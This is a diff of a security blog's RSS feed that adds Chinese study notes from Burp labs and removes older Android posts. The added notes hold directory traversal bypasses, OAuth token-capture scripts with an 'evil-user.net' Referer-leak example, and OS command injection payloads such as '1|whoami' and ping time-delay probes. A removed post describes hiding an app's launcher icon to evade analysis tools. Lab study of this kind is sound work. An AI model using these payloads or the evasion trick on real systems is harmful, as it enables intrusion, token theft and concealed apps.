@@ -13,6 +13,26 @@
         <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
         <lastBuildDate>Thu, 22 Dec 2022 20:44:54 +0800</lastBuildDate>
         <item>
+            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-3/</guid>
+            <title>BurpLab_3-Directory_traversal</title>
+            <link>http://ericcd.com/2022/12/22/BurpLab-3/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;一个简单特点&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;/loadImage?filename=1.png&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;有的服务器会禁止使用相对地址，可以尝试使用绝对地址。&lt;/li&gt;
+&lt;li&gt;有的会替换掉一些关键字符，试着用....// 或 ..../ 绕过。&lt;/li&gt;
+&lt;li&gt;爆破&lt;/li&gt;
+&lt;li&gt;有的要求固定文件路径开头&lt;/li&gt;
+&lt;li&gt;有的要求以特定格式（比如.png）结尾，用 %00 做截断。&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-2/</guid>
             <title>BurpLab_2-Authentication</title>
             <link>http://ericcd.com/2022/12/22/BurpLab-2/</link>
@@ -72,8 +92,35 @@
 有时还可以利用开放重定向漏洞配合目录穿越漏洞来实现网页跳转。&lt;br /&gt;
 有时更改其他标志，比如将 response_mode 改为 fragment 有时也能绕过筛查。&lt;/li&gt;
 &lt;li&gt;一段 payload&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (!document.location.hash) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        window.location = &amp;#x27;URL&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        window.location = &amp;#x27;/?&amp;#x27;+document.location.hash.substr (1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (!document.location.hash) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        window.location = &amp;#x27;URL&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        window.location = &amp;#x27;/?&amp;#x27;+document.location.hash.substr (1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+3.otherWindow.postMessage (message, targetOrigin, [transfer]);&lt;br /&gt;
+message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
+以下脚本可以接收并传递传出来的信息。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    window.addEventListener (&amp;#x27;message&amp;#x27;, function (e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fetch (&amp;quot;/&amp;quot; + encodeURIComponent (e.data.data))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;, false)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+4.HTML injection vulnerabilities&lt;br /&gt;
+ 有的浏览器（比如火狐），在加载一些元素时（比如 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2V2aWwtdXNlci5uZXQ=&#34;&gt;evil-user.net&lt;/span&gt;&amp;quot;&amp;gt;），会将整个 URL 放在 refer 头里，包括一些我们关心的查询字符串。&lt;/li&gt;
 &lt;/ol&gt;
+&lt;h2 id=&#34;openid-connect&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#openid-connect&#34;&gt;#&lt;/a&gt; OpenID Connect&lt;/h2&gt;
+&lt;p&gt;考虑到 OpenID 是建立在 OAuth 上，许多前面提到的 OAuth 存在的问题 OpenID 也存在，接下来介绍以下由 OpenID 带来的新问题。&lt;br /&gt;
+1.Unprotected dynamic client registration&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-4/</guid>
+            <title>BurpLab_4-OS_command_injection</title>
+            <link>http://ericcd.com/2022/12/22/BurpLab-4/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;executing-arbitrary-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#executing-arbitrary-commands&#34;&gt;#&lt;/a&gt; Executing arbitrary commands&lt;/h1&gt;
+&lt;p&gt;最基础的 payload&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; echo aiwefwlguh &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1|whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+2. 常用指令&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 应用                      Linux          Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用户名                  whoami         whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 操作系统              uname -a       ver&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络设置              ifconfig              ipconfig /all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络连接              netstat -an         netstat -an&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 进程                     ps -ef          tasklist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;detecting-blind-os-command-injection-using-time-delays&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#detecting-blind-os-command-injection-using-time-delays&#34;&gt;#&lt;/a&gt; Detecting blind OS command injection using time delays&lt;/h1&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; ping -c 10 127.0.0.1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|ping+-c+10+127.0.0.1||&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -750,73 +797,6 @@ Context Manager 还提供用于 Android 内的各种系统服务信息。应用�
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  pragma pack (1)  // 按照 1 字节对齐，等于没对齐。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 &lt;h1 id=&#34;使用-malloc-分配空间后向其中写入-char但是发现-cout-时后续跟了许多脏字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-malloc-分配空间后向其中写入-char但是发现-cout-时后续跟了许多脏字符&#34;&gt;#&lt;/a&gt; 使用 malloc 分配空间后，向其中写入 char，但是发现 cout 时后续跟了许多脏字符&lt;/h1&gt;
 &lt;p&gt;如果 malloc 申请的空间长度等于需要写入的字符长度，那么 cout 时在字符末尾找不到终止符，会继续读，直到遇见终止符为止。建议使用 calloc 来分配空间，该函数能将分配的空间初始化为 0，并且申请的空间长度应该为字符长度 + 1。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/02/28/Android-reverce-2022.2.8-1/</guid>
-            <title>Android 逆向 - 2022.28-1</title>
-            <link>http://ericcd.com/2022/02/28/Android-reverce-2022.2.8-1/</link>
-            <category term="Android逆向知识" scheme="http://ericcd.com/categories/Android%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86/" />
-            <category term="jni" scheme="http://ericcd.com/tags/jni/" />
-            <category term="ndk" scheme="http://ericcd.com/tags/ndk/" />
-            <category term="静态注册" scheme="http://ericcd.com/tags/%E9%9D%99%E6%80%81%E6%B3%A8%E5%86%8C/" />
-            <pubDate>Mon, 28 Feb 2022 09:34:57 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录一些 jni 中的函数使用与静态注册相关知识。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h1 id=&#34;可执行程序编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可执行程序编译&#34;&gt;#&lt;/a&gt; 可执行程序编译&lt;/h1&gt;
-&lt;p&gt;首先准备 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0FuZHJvaWQubWs=&#34;&gt;Android.mk&lt;/span&gt; 文件，文件内容如下所示：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ LOCAL_PATH := $(call my-dir)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ include $(CLEAR_VARS)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ LOCAL_ARM_MODE := arm #确定编译后的指令集 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ LOCAL_MODULE := example #模块名称 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ LOCAL_SRC_FILES := JNI_example.c #c 源文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ LOCAL_LDLIBS += -llog #依赖库 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ include $(BUILD EXECUTABLE) #将.c 构建为可执行程序，使用 shared_library 则会生成动态链接库， 使用 static_library 会生成静态链接库 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 准备 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0FwcGxpY2F0aW9uLm1r&#34;&gt;Application.mk&lt;/span&gt; 文件，文件内代码如下所示：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$  APP_API := x86 armeabi-v7a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 在以上文件存储处打开 cmd，执行 ndk-build 指令生成 linux 下的可执行程序。&lt;/p&gt;
-&lt;h1 id=&#34;相关函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关函数&#34;&gt;#&lt;/a&gt; 相关函数&lt;/h1&gt;
-&lt;p&gt;jni 中的函数可以在 /java/include 下的 jni.h 文件中查询，以下只列举了一些可能使用到的函数。&lt;/p&gt;
-&lt;h2 id=&#34;调用-java-层普通方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#调用-java-层普通方法&#34;&gt;#&lt;/a&gt; 调用 java 层普通方法&lt;/h2&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ （*CallObjectMethod) (JNIEnv*, jobject, jmethodID, ...);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 前两个为默认参数，第三个参数由以下方法获取。&lt;/p&gt;
-&lt;h2 id=&#34;获取-java-层实例方法的值&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取-java-层实例方法的值&#34;&gt;#&lt;/a&gt; 获取 java 层实例方法的值&lt;/h2&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$  jmethodID (*GetMethodID) (JNIEnv*, jclass, const char*, const char*);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 其中，第一个 const char * 为 java 层方法名称，第二个 const char * 为 java 层方法的签名 (即方法返回类型)，而 jclass 由以下方法获取：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ jclass (*FindClass) (JNIEnv*, const char*)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 其中，const char * 为目标所在 class 的路径 (使用 \ 代替.)。&lt;/p&gt;
-&lt;h2 id=&#34;获取-java-层实例字段的值&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取-java-层实例字段的值&#34;&gt;#&lt;/a&gt; 获取 java 层实例字段的值&lt;/h2&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ jobject (*GetObjectField) (JNIEnv*, jobject , jfieldID);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 其中，jfieldID 由以下代码获取：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ jfieldID (*GetFieldID) (JNIenv*, jclass, const char*, const char*);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 第一个 const char * 为实例字段的名称，第二个 const char * 为实例字段签名 (即实例字段类型)。&lt;/p&gt;
-&lt;h2 id=&#34;设置-java-层实例字段的值&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#设置-java-层实例字段的值&#34;&gt;#&lt;/a&gt; 设置 java 层实例字段的值&lt;/h2&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ void (*SetObjectField) (JNIEnv*, jobject, jfieldID, jobject);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 第二个 jobject 为 java 层实例字段设置的值。&lt;/p&gt;
-&lt;h1 id=&#34;静态注册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#静态注册&#34;&gt;#&lt;/a&gt; 静态注册&lt;/h1&gt;
-&lt;h2 id=&#34;生成-jni-头文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#生成-jni-头文件&#34;&gt;#&lt;/a&gt; 生成 jni 头文件&lt;/h2&gt;
-&lt;p&gt;在 class 代码中声明 native 方法，之后在 cmd 窗口中切换到源码目录处，执行以下代码生成 jni 头文件：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ javah -jni com.example.main.class&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h2 id=&#34;编写-c-代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编写-c-代码&#34;&gt;#&lt;/a&gt; 编写 c 代码&lt;/h2&gt;
-&lt;p&gt;在 c 文件中 include 之前生成的头文件，之后便能在 c 文件中具体实现在头文件中声明的函数。&lt;/p&gt;
-&lt;h2 id=&#34;生成动态链接库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#生成动态链接库&#34;&gt;#&lt;/a&gt; 生成动态链接库&lt;/h2&gt;
-&lt;p&gt;将之前的两个 mk 文件同.c 与.h 文件放在同一文件夹下，使用 ndk-build 生成动态链接库文件。&lt;/p&gt;
-&lt;h2 id=&#34;调用动态链接库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#调用动态链接库&#34;&gt;#&lt;/a&gt; 调用动态链接库&lt;/h2&gt;
-&lt;p&gt;在 java 代码中使用以下代码调用生成的动态链接库：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ System.loadLibrary (&amp;quot;Module&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
-&lt;p&gt;将以上个部分内容相结合，即可实现在 native 层调用 java 函数或获取 java 变量值。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/02/27/Android-Knowledge/</guid>
-            <title>Android 知识</title>
-            <link>http://ericcd.com/2022/02/27/Android-Knowledge/</link>
-            <category term="Android" scheme="http://ericcd.com/categories/Android/" />
-            <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/" />
-            <pubDate>Sun, 27 Feb 2022 16:26:04 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录一些学习到的 Android 相关知识。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
-1.application 中的 android:name 属性用来指定 app 启动时关联的 application，默认关联的为 android.app.Application。也可以将其设置为一个我们自己编辑的 class，该 class 将被 application 下的所有 activity 共享。&lt;br /&gt;
-2.android.intent.action.MAIN 用于决定程序最先启动的 Activity，android.intent.category.LAUNCHER 用于决定程序是否显示在程序列表（桌面）里。没有 android.intent.action.MAIN，能够安装程序，但桌面不会显示启动器，程序也无法运行。&lt;br /&gt;
-没有 android.intent.category.LAUNCHER，程序可以正常运行，但是桌面不会显示启动器。一个 apk 中有多个 activity 中存在 android.intent.action.MAIN 和 android.intent.category.LAUNCHER，桌面上会显示复数个应用图标，但是对应的为同一应用文件。&lt;br /&gt;
-3. 在 Android 中使用 android.os.build 来获取设备相关信息，而 android.os.build 通过 SystemProperties.getString 来获取静态字段值，Systemproperties 是 android.os 中标记为 hide 的类，无法直接访问，但是可以通过反射的方式获取。该类使用 native 方法 native_get 来后去系统属性值，该方法的源代码在 android_os_SystemProperties.cpp 文件中。&lt;br /&gt;
-4. 将 android.intent.category.LAUNCHER 更改为 -.INFO 或 -.FRAMEWORK_INSTRUMENTATION_TEST, 能够实现在桌面上隐藏程序同时不影响程序正常运行。并且因为没有了 android.inntent.category.LAUNCHER 作为特征，一些 apk 分析工具就无法定位 MainActivity。&lt;br /&gt;
-5. 可以将 Androidmanifest 中的一些非必要标签的资源 ID 改为 0，从而屏蔽实现该标签的作用。&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
